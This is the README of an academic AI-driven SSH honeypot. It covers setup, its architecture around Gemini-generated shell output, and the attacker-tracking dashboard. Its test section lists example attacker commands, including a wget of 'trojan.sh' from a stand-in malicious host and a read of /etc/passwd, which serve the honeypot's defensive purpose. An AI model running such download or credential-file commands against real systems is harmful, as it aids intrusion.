# AdaptiveWardens: AI-Driven Adaptive Honeypot

An AI-powered honeypot that simulates a realistic compromised corporate SSH server. Attackers interact with a fully sandboxed environment where unknown commands are handled by Google Gemini in real-time, producing consistent and believable responses. All sessions, commands, and indicators of compromise are logged and visualized on a live dashboard.

---

## 🚀 Quick Start

### 1. Clone the repository

```bash
git clone https://github.com/Aligithyb/-AdaptiveWardens.git
cd AdaptiveWardens
```

### 2. Set up environment variables

You need two `.env` files:

**Root `.env`** (for Docker Compose to pick up the Gemini key):
```bash
cat > .env << 'EOF'
GEMINI_API_KEY=your_gemini_api_key_here
EOF
```

**AI Engine `.env`** (used directly by the AI service):
```bash
cat > ai-engine/.env << 'EOF'
GEMINI_API_KEY=your_gemini_api_key_here
SANDBOX_URL=http://sandbox-store:8001
EOF
```

> Get your free Gemini API key at: https://aistudio.google.com/app/apikey

### 3. Start everything

```bash
./start.sh
```

### 4. Access the dashboard

```bash
open http://localhost:3000
```

### 5. Test the honeypot

```bash
ssh root@localhost -p 2222
# Try any password — it accepts everything
# Then try: wget http://malicious.com/trojan.sh
# Or: cat /etc/passwd
# Or: echo "hello"
```

---

## 🏗️ Architecture

```
Attacker
   │
   ▼
SSH Honeypot (port 2222)
   │
   ├── Static commands (whoami, ls, cat) ──► Sandbox Store (SQLite DB)
   │
   └── Unknown commands ──► AI Engine (Gemini) ──► Realistic response
                                    │
                                    └── Response cached for consistency
   │
   ▼
Sandbox Store (port 8001)
   │  Logs all sessions, commands, files, processes
   │
   ▼
Dashboard (port 3000)
   │  Live sessions, IOC summary, MITRE ATT&CK mapping,
   │  session playback, metrics
```

---

## 📦 Services

| Service | Port | Description |
|---|---|---|
| `ssh-frontend` | 2222 | SSH honeypot — accepts all logins |
| `sandbox-store` | 8001 | SQLite API — stores sessions, commands, filesystem |
| `ai-engine` | 8002 | Gemini-powered shell response generator |
| `dashboard-frontend` | 3000 | Next.js real-time SOC dashboard |

---

## 🤖 How the AI Works

When an attacker types a command the honeypot doesn't have a static response for, the SSH server sends it to the AI engine which calls the Gemini API with:

- The command typed
- Current session context (username, working directory)
- Last 5 commands for consistency

Gemini responds with realistic terminal output. The response is cached for 5 minutes so if the same command is run again, the attacker gets the same response — making the environment feel real and consistent.

**Static responses** (instant, no AI needed):
- `whoami`, `id`, `hostname`, `uname`, `ifconfig`
- `ls`, `cat`, `touch`, `mkdir`, `ps`, `env`
- `cd`, `exit`, `logout`

**AI-generated responses** (everything else):
- `wget`, `curl`, `nmap`, `echo`, custom scripts, etc.

---

## 📊 Dashboard Features

- **Live Sessions** — real-time table of active attacker connections
- **Session Playback** — replay every command typed in a session
- **IOC Summary** — extracted IPs, domains, and files with severity ratings
- **MITRE ATT&CK Mapping** — automatically maps attacker behavior to ATT&CK techniques
- **Session Metrics** — stats on total sessions, commands, risk levels

---

## 🛠️ Useful Commands

```bash
# Start everything
./start.sh

# Stop everything
./stop.sh

# View all logs
docker-compose logs -f

# View specific service logs
docker-compose logs -f ssh-frontend
docker-compose logs -f ai-engine
docker-compose logs -f sandbox-store
docker-compose logs -f dashboard-frontend

# Restart a single service
docker-compose restart ai-engine

# Rebuild after code changes
docker-compose build --no-cache
docker-compose up -d
```

---

## 📁 Project Structure

```
AdaptiveWardens/
├── ssh-frontend/          # SSH honeypot server (Python + asyncssh)
│   ├── src/ssh_server.py
│   ├── requirements.txt
│   └── Dockerfile
├── sandbox-store/         # Database API (FastAPI + SQLite)
│   ├── src/api.py
│   ├── schemas/
│   ├── requirements.txt
│   └── Dockerfile
├── ai-engine/             # Gemini AI response engine (FastAPI)
│   ├── src/
│   │   ├── api.py
│   │   ├── llm_provider.py
│   │   └── response_cache.py
│   ├── requirements.txt
│   └── Dockerfile
├── dashboard-frontend/    # SOC Dashboard (Next.js + Tailwind)
│   ├── src/
│   │   ├── app/
│   │   └── components/
│   └── Dockerfile
├── docker-compose.yml
├── start.sh
├── stop.sh
└── .env                   # ← You create this (not committed)
```

---

## ⚠️ Important Notes

- **Never commit your `.env` files** — they contain your API key
- The honeypot is sandboxed — no real commands execute on your machine
- The SSH server accepts any username and password by design
- Gemini responses are cached for 5 minutes to ensure consistency
- The `honeypot-internal` Docker network has no internet access by design — only the AI engine and dashboard are allowed outbound access

---

## 📄 License

Academic project — Fall 2025
